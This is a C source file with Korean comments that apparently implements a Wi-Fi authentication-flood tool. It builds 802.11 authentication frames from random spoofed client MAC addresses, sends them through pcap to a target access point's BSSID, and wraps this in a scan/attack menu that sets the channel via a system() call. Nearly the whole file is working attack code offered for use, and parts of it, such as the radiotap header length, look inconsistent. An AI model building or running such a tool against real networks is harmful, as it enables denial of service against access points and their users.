#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <time.h>
#include <unistd.h>
#include <signal.h>
#include <ctype.h>
#include "network_ver2.h"

#define DELAY 10000  // 마이크로초 단위 (0.01초)

// 무작위 MAC 주소 생성 함수
void make_random_mac(unsigned char *mac) {
    mac[0] = 0x02;  // 로컬/무작위 비트 설정
    mac[1] = 0x00;
    mac[2] = 0x00;
    mac[3] = rand() % 256;
    mac[4] = rand() % 256;
    mac[5] = rand() % 256;
}

// Auth Flood 패킷 전송 함수
void send_auth_flood(pcap_t *handle, unsigned char *target_bssid, unsigned char *fake_client) {
    unsigned char packet[128];
    int offset = 0;
    
    // Radiotap Header (실제 작동하는 버전)
    unsigned char rt[] = { 
        0x00, 0x00,           // version, pad
        0x0c, 0x00,           // len: 12 bytes
        0x00, 0x80, 0x08, 0x00, // present flags (TSFT, Flags, Rate, Channel, dBm_AntSignal)
        0x00, 0x00, 0x00, 0x00, // timestamp
        0x18,                 // flags
        0x00,                 // data rate (6 Mbps)
        0x00, 0x00, 0x00, 0x00, // channel frequency
        0x20, 0x00,           // channel flags
        -50                   // signal strength (dBm)
    };
    
    memcpy(packet, rt, sizeof(rt)); 
    offset += sizeof(rt);
    
    // IEEE 802.11 Auth Frame
    // Frame Control: Type=0(Management), Subtype=11(Auth), ToDS=0, FromDS=0
    packet[offset++] = 0xB0;   // Type/Subtype: Management/Auth
    packet[offset++] = 0x00;   // Flags
    packet[offset++] = 0x00;   // Duration LSB (314 us)
    packet[offset++] = 0x00;   // Duration MSB
    
    // Destination Address (Receiver) = AP
    memcpy(packet + offset, target_bssid, 6);
    offset += 6;
    
    // Source Address (Transmitter) = Fake Client
    memcpy(packet + offset, fake_client, 6);
    offset += 6;
    
    // BSSID = AP
    memcpy(packet + offset, target_bssid, 6);
    offset += 6;
    
    // Sequence Control: Fragment 0, Sequence number (random)
    packet[offset++] = 0x00;   // Fragment number & sequence LSB
    packet[offset++] = (rand() % 4096) >> 4;   // Sequence number MSB
    
    // Fixed Authentication Parameters
    // Authentication Algorithm: 0 = Open System
    packet[offset++] = 0x00;   // Algorithm LSB
    packet[offset++] = 0x00;   // Algorithm MSB
    
    // Authentication Transaction Sequence: 1
    packet[offset++] = 0x01;   // Sequence LSB
    packet[offset++] = 0x00;   // Sequence MSB
    
    // Status Code: 0 = Successful
    packet[offset++] = 0x00;   // Status LSB
    packet[offset++] = 0x00;   // Status MSB
    
    // 패킷 전송
    if (pcap_sendpacket(handle, packet, offset) != 0) {
        fprintf(stderr, "패킷 전송 실패: %s\n", pcap_geterr(handle));
    }
}

// 메인 메뉴
int main() {
    int choice;
    char target_bssid_str[18];
    unsigned char target_bssid[6];
    char error_buf[PCAP_ERRBUF_SIZE];
    char interface[16] = "wlan0mon";  // 기본 인터페이스
    int attack_type;
    
    srand(time(NULL));
    
    while(1) {
        printf("\n1. 스캔 \n2. 공격\n3. 종료\n선택: ");
        scanf("%d", &choice);
        getchar(); // 버퍼 클리어

        if (choice == 1) {
            // 네트워크 스캐닝
            printf("스캔 중...\n");
            
            start_wifi_scan("wlan0mon");
            getchar();
            
        } else if (choice == 2) {
            // 공격 실행
            
            // 타겟 BSSID 입력
            printf("타겟 BSSID 입력 (예: AA:BB:CC:DD:EE:FF): ");
            scanf("%17s", target_bssid_str);
            
            // MAC 주소 파싱
            if (sscanf(target_bssid_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                      &target_bssid[0], &target_bssid[1], &target_bssid[2],
                      &target_bssid[3], &target_bssid[4], &target_bssid[5]) != 6) {
                printf("잘못된 MAC 주소 형식입니다.\n");
                continue;
            }
            
            // 채널 입력
            int channel;
            printf("타겟 채널 입력 (예: 6): ");
            scanf("%d", &channel);
            
            // 채널 설정
            char cmd[64];
            sprintf(cmd, "iwconfig %s channel %d", interface, channel);
            system(cmd);
            printf("채널 %d로 설정 완료\n", channel);
            
            // 패킷 수 입력
            int packet_count;
            printf("전송할 패킷 수: ");
            scanf("%d", &packet_count);
            
            // pcap 핸들 열기
            pcap_t *handle = pcap_open_live(interface, 2048, 1, 1000, error_buf);

            
            printf("\n공격 시작\n");
            

            printf("\n공격 중...\n");
            // 공격 실행
            for(int i = 0; i < packet_count; i++) {
                unsigned char fake_client[6];
                make_random_mac(fake_client);
                
                send_auth_flood(handle, target_bssid, fake_client);
                
                if ((i + 1) % 100 == 0) {
                    printf("%d/%d 패킷 전송 완료\n", i + 1, packet_count);
                }
                
                usleep(DELAY);
            }
            
            pcap_close(handle);
            printf("\n공격 완료!\n");
            printf("엔터를 누르면 메뉴로 돌아갑니다...");
            getchar(); // 첫 번째 개행 처리
            getchar(); // 사용자 입력 대기
            
        } else if (choice == 3) {
            // 종료
            printf("\n프로그램을 종료합니다.\n");
            break;
            
        } else {
            printf("\n잘못된 선택입니다. 다시 시도하세요.\n");
        }
    }
    
    return 0;
}
